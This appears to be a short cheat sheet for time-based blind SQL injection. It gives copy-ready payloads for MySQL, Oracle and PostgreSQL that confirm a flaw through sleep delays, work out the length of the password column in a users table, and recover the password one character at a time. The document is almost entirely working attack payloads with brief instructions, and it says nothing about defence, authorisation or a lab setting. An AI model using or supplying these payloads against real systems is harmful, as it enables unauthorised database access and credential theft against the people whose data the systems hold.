This technique introduces delays to confirm whether a condition is true.


## 1. Verify Vulnerability with a Delay

For **MySQL** (SLEEP function):
```sql
' || SLEEP(5) --  
```
For **Oracle** (DBMS_LOCK.sleep function):
```sql
' || DBMS_LOCK.sleep(5) --  
```

- **For PostgreSQL (pg_sleep function):**
```sql
' || pg_sleep(5) --  
```
If the response is delayed, the injection is working.

## 2. Extract Password Length
- **For MySQL:**

```sql
' || IF(LENGTH(password)=10, SLEEP(5), 0) FROM users --  
``` 
- **For PostgreSQL:**
```sql    
' || CASE WHEN LENGTH(password)=10 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --  
```
- **For Oracle:**     
```sql
' || CASE WHEN LENGTH(password)=10 THEN DBMS_LOCK.sleep(5) ELSE NULL END FROM users --  
```
If the delay occurs, the password is 10 characters long.

## 3. Extract Each Character Using Delay

- **For MySQL:**
```sql
' || IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) FROM users --  
``` 
- **For Oracle:**
```sql
' || CASE WHEN SUBSTR(password,1,1)='a' THEN DBMS_LOCK.sleep(5) ELSE NULL END FROM users --  
```
 
- **For PostgreSQL:**    
```sql
' || CASE WHEN SUBSTRING(password FROM 1 FOR 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --  
```

Repeat this for each character to reconstruct the full password.